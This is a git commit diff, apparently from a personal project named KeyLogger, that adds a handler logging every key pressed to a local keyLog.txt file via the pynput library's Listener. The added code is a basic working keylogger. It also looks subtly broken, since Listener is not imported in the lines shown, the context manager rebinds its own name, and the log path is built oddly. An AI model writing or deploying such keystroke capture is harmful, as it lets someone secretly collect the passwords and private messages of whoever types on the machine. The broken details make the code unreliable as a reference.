6a5a8abd0a7c77248bd13c5e047c580ce3ada918
sassanghz <sassanghazi@gmail.com>
2024-08-15 01:39:42 -0600

    function copy

--- pynput.py
+++ pynput.py
@@ -4,3 +4,10 @@ import logging
 
 log_dir = r"C:\Users\sassa\OneDrive\Documents\GitHub\KeyLogger\pynput.py"
 logging.basicConfig(filename= (log_dir + r"/keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+
+def on_press(key):
+    logging.info(str(key))
+
+with Listener(on_press=on_press) as Listener:
+    Listener.join();
